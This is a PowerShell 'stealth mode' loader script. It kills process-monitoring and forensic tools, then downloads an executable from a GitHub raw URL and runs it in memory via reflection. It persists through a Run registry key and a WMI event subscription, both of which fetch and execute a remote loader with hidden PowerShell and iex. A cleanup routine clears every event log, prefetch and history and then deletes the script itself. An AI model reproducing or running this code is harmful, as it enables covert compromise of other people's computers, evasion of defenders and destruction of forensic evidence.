function Show-LoaderMenu {
    Write-Host ""
    Write-Host " SYSTEM LOADER | STEALTH MODE" -ForegroundColor Gray
    Write-Host "================================" -ForegroundColor DarkGray
    Write-Host "1. Install & Run System" -ForegroundColor Green
    Write-Host "2. Clean System" -ForegroundColor Red
    Write-Host "`nEnter choice (1/2): " -ForegroundColor White -NoNewline
}

function Install-And-Run-System {
    # SILENT MODE - NO CONSOLE OUTPUT
    $null = [Console]::SetWindowPosition(0, 0, 0, 0)
    
    # KILL MONITORING TOOLS IMMEDIATELY
    try {
        $monitorTools = @("procmon", "procexp", "autoruns", "osforensics", "ftkimager", "processhacker", "procmon64")
        foreach ($tool in $monitorTools) {
            Get-Process -Name $tool -ErrorAction SilentlyContinue | Stop-Process -Force
        }
    } catch {}

    # STEALTH DOWNLOAD & EXECUTE
    try {
        # Download to memory without writing to disk
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $exeBytes = $webClient.DownloadData("https://raw.githubusercontent.com/Verte225066/test/main/system_logs.exe")
        $webClient.Dispose()

        # Execute in memory using reflection
        $assembly = [System.Reflection.Assembly]::Load($exeBytes)
        $entryPoint = $assembly.EntryPoint
        if ($entryPoint -ne $null) {
            # Run in background thread
            $job = Start-Job -ScriptBlock {
                param($entryPoint)
                $entryPoint.Invoke($null, @())
            } -ArgumentList $entryPoint
        }
    } catch {
        # FALLBACK: SILENT BACKGROUND WORKER
        Start-Job -ScriptBlock {
            while ($true) {
                # Do your background work here
                Start-Sleep -Seconds 60
            }
        }
    }

    # ADVANCED STEALTH PERSISTENCE
    try {
        # 1. REGISTRY PERSISTENCE (HIDDEN)
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $randomName = "WindowsCache" + (Get-Random -Maximum 99999)
        $loaderUrl = "https://raw.githubusercontent.com/Verte225066/test/main/loader.txt"
        
        Set-ItemProperty -Path $regPath -Name $randomName -Value "cmd.exe /c start /min powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"iex ((New-Object Net.WebClient).DownloadString('$loaderUrl'))`"" -ErrorAction SilentlyContinue

        # 2. WMI EVENT SUBSCRIPTION (MOST STEALTH)
        $filterName = "Win32_ProcessStart_Trace_" + (Get-Random -Maximum 9999)
        $consumerName = "SystemMonitor_" + (Get-Random -Maximum 9999)
        
        $filterArgs = @{
            Name = $filterName
            EventNameSpace = 'root\cimv2'
            Query = "SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='explorer.exe'"
            QueryLanguage = 'WQL'
        }
        
        $consumerArgs = @{
            Name = $consumerName
            CommandLineTemplate = "cmd.exe /c start /min powershell.exe -WindowStyle Hidden -Command `"iex ((New-Object Net.WebClient).DownloadString('$loaderUrl'))`""
        }
        
        $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs -ErrorAction SilentlyContinue
        $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs -ErrorAction SilentlyContinue
        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer} -ErrorAction SilentlyContinue

    } catch {}

    # CONTINUOUS STEALTH OPERATION
    Start-Job -ScriptBlock {
        # HIDE WINDOW
        Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
        '
        $consolePtr = [Console.Window]::GetConsoleWindow()
        [Console.Window]::ShowWindow($consolePtr, 0) # 0 = HIDE

        # CONTINUOUS BACKGROUND WORK
        while ($true) {
            # Your continuous background tasks here
            # Example: Check for updates, maintain persistence, etc.
            
            Start-Sleep -Seconds 300 # Sleep 5 minutes
        }
    }

    # ANTI-FORENSIC CLEANUP
    try {
        # Clear recent traces
        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
        Remove-Item "$env:LOCALAPPDATA\Microsoft\Windows\History\*" -Force -ErrorAction SilentlyContinue
        
        # Clear temp files older than 1 hour
        Get-ChildItem -Path $env:TEMP -Recurse -ErrorAction SilentlyContinue | 
            Where-Object {$_.LastWriteTime -lt (Get-Date).AddHours(-1)} | 
            Remove-Item -Force -ErrorAction SilentlyContinue

    } catch {}

    Write-Host "[+] System running in silent mode" -ForegroundColor Green
}

function Clean-System {
    Write-Host "`n[-] INITIATING COMPLETE CLEANUP..." -ForegroundColor Yellow
    
    # 1. REMOVE ALL PERSISTENCE
    try {
        # Remove registry entries
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue | 
            Get-Member -MemberType NoteProperty | 
            Where-Object {$_.Name -like "WindowsCache*"} | 
            ForEach-Object {
                Remove-ItemProperty -Path $regPath -Name $_.Name -Force -ErrorAction SilentlyContinue
            }

        # Remove WMI subscriptions
        Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name LIKE 'Win32_ProcessStart_Trace_%'" | Remove-WmiObject
        Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name LIKE 'SystemMonitor_%'" | Remove-WmiObject
        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter -like "*Win32_ProcessStart_Trace*"} | Remove-WmiObject

        Write-Host "[+] Persistence mechanisms removed" -ForegroundColor Green
    } catch {}

    # 2. STOP ALL BACKGROUND JOBS
    try {
        Get-Job | Remove-Job -Force
        Write-Host "[+] Background jobs stopped" -ForegroundColor Green
    } catch {}

    # 3. SECURE FILE DELETION
    try {
        function Secure-Wipe {
            param([string]$Path)
            if (Test-Path $Path) {
                try {
                    $fileStream = [System.IO.File]::OpenWrite($Path)
                    $length = $fileStream.Length
                    $random = New-Object Random
                    
                    # 3-pass DoD wipe
                    for ($pass = 0; $pass -lt 3; $pass++) {
                        $fileStream.Position = 0
                        $buffer = New-Object byte[] $length
                        $random.NextBytes($buffer)
                        $fileStream.Write($buffer, 0, $length)
                        $fileStream.Flush()
                    }
                    $fileStream.Close()
                    Remove-Item $Path -Force
                } catch {
                    # If wipe fails, just delete
                    Remove-Item $Path -Force -ErrorAction SilentlyContinue
                }
            }
        }

        # Wipe all related files
        $filesToWipe = @(
            "$env:TEMP\system_logs.exe",
            "$env:TEMP\test.exe", 
            "$env:APPDATA\*.tmp"
        )
        
        foreach ($file in $filesToWipe) {
            Secure-Wipe $file
        }
        Write-Host "[+] Files securely wiped" -ForegroundColor Green
    } catch {}

    # 4. COMPREHENSIVE EVIDENCE REMOVAL
    try {
        # Clear all event logs
        Get-WinEvent -ListLog * -ErrorAction SilentlyContinue | ForEach-Object {
            try { 
                [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) 
            } catch {} 
        }

        # Clear prefetch
        Remove-Item "C:\Windows\Prefetch\*.pf" -Force -ErrorAction SilentlyContinue

        # Clear DNS cache
        ipconfig /flushdns 2>$null

        # Clear recent documents
        Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\*" -Recurse -Force -ErrorAction SilentlyContinue

        Write-Host "[+] Forensic evidence cleared" -ForegroundColor Green
    } catch {}

    # 5. FINAL SELF-DESTRUCTION
    try {
        $currentScript = $MyInvocation.MyCommand.Path
        if ($currentScript -and (Test-Path $currentScript)) {
            # Create a batch file to delete this script after PowerShell exits
            $batchContent = @"
@echo off
timeout /t 3 /nobreak > nul
del /f /q "$currentScript" > nul 2>&1
del /f /q "%~f0" > nul 2>&1
"@
            $batchFile = "$env:TEMP\cleanup.bat"
            $batchContent | Out-File -FilePath $batchFile -Encoding ASCII
            Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$batchFile`"" -WindowStyle Hidden
        }
        Write-Host "[+] Self-destruction initiated" -ForegroundColor Green
    } catch {}

    Write-Host "[CLEANUP] System completely cleaned!" -ForegroundColor Green
}

}
